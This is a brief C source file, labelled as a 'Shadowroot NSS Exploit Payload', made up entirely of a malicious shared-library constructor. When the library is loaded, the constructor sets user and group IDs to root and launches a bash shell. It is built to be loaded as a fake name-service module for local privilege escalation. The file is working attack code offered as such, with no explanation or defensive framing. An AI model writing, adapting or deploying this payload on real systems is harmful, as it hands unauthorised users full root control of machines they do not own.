// corelib_root.c
// Shadowroot NSS Exploit Payload

#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void root_elevate(void) {
    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");
    execl("/bin/bash", "bash", NULL);
}
